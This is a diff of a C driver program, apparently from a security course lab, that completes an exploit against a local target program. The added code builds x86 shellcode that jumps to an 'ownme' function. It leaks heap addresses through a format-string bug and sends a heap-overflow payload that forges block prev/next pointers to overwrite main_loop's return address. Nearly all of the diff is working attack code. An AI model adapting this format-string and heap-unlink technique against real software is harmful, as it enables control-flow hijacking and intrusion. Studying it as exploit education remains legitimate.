@@ -125,7 +125,6 @@ int main(int argc, char* argv[]) {
 
    getchar();
 
-   // TODO: HOW TO GET BLOCK SIZE?
    // Values needed for attack
    void *mainloop_bp = (void*) 0xbf8c2e18; // saved ebp for main_loop
    void *mainloop_ra = (void*) 0x804b652; // main_loop's return address
@@ -152,34 +151,79 @@ int main(int argc, char* argv[]) {
    fprintf(stderr, "driver: New ra location=%x\n", cur_mainloop_ra_loc);
 
    // Use RA to compute location of ownme and generate exploit code.
-   // Exploit code is instruction jmp cur_ownme_addr in assembly
+   char code_template[] =
+      "\xB8\x00\x00\x00\x00"  /* mov $<ownme_addr>, %eax */
+      "\xFF\xD0"              /* call *%eax */
+      "\x31\xC0"              /* xor %eax, %eax (sets return value) */
+      "\x68\x00\x00\x00\x00"  /* push $<cur_main_ra> */
+      "\xC3"                  /* ret */
+   ;
+
    unsigned cur_ownme_addr = cur_mainloop_ra + mainloop_ownme_diff;
-   fprintf(stderr, "driver: New ownme address=%x\n", cur_ownme_addr);
-
-   char exploit_code[16] = "\xEA\x0";
-   sprintf((char*)exploit_code + 8, "%x", cur_ownme_addr);
-   exploit_code[15] = '\0';
    
-   // TODO: WRITE EXPLOIT CODE TO HEAP BLOCK AND GET ITS ADDRESS
-   // CONSTRUCT PAYLOAD FOR HEAP OVERFLOW
-   // MANIPULATE HEAP BLOCK ORDER/INSERT PAYLOAD
-   // EXECUTE HEAP OVERFLOW
+   memcpy((char*)code_template + 1, &cur_ownme_addr, sizeof(unsigned));
+   memcpy((char*)code_template + 10, &cur_mainloop_ra, sizeof(unsigned));
+   
+   fprintf(stderr, "driver: Code generated. Ownme addr=%x\n", cur_ownme_addr);
+   
+   // Write exploit code to a heap block using the p command
+   put_str("p ");
+   put_bin(code_template, 16);
+   put_str("\n");
+   send();
 
+   // Read address of block with exploit code (623 offset to pass in main_loop)
+   put_str("e %623$x\n");
+   send();
+
+   unsigned code_addr;
+   get_formatted("%x", &code_addr);
+   fprintf(stderr, "driver: address of exploit block=%x\n", code_addr);
+
+   // Allocate another block to hold the new return address for main_loop
+   // and read its address
    put_str("p xyz\n");
    send();
+
+   put_str("e %623$x\n");
+   send();
+
+   unsigned ra_block_addr;
+   get_formatted("%x", &ra_block_addr);
+   fprintf(stderr, "driver: address of ra block=%x\n", ra_block_addr);
+
+   // Construct payload for overflow
+   unsigned blocksz = code_addr - ra_block_addr;
+   unsigned payloadsz = blocksz - 3 * sizeof(int);
+   unsigned explsz = payloadsz + blocksz;
+   
+   void** expl = (void**)malloc(explsz);
+   memset((void*)expl, '\0', explsz); // ensures ra_block->in_use == 0
+
+   expl[blocksz/sizeof(void*)] = (void*)code_addr;                      // ra_block->prev = code_addr
+   expl[blocksz/sizeof(void*) + 1] = (void*)(cur_mainloop_ra_loc - 12); // ra_block->next = ML_RA - 12
+
+   // Execute heap overflow
+   put_str("p ");
+   put_bin((void*)expl, explsz);
+   put_str("\n");
+   send();
+
+   // Call user command to satisfy requirements of program
    put_str("u abc\n");
    send();
 
-   // 622 and 623 are the offsets to the local variables user and pass, respectively
-   put_str("e %622$x %623$x");
+   // Login, then quit to trigger call to ownme
+   put_str("l\n");
+   send();
+   usleep(100000);
+   
+   put_str("q\n");
    send();
 
-   unsigned cur_userp, cur_passp;
-   get_formatted("%x%x", &cur_userp, &cur_passp);
-   fprintf(stderr, "driver: user=%x, pass=%x\n", cur_userp, cur_passp);
-
    usleep(100000);
-
+   get_formatted("%*s");
+   
    kill(pid, SIGINT);
    int status;
    wait(&status);
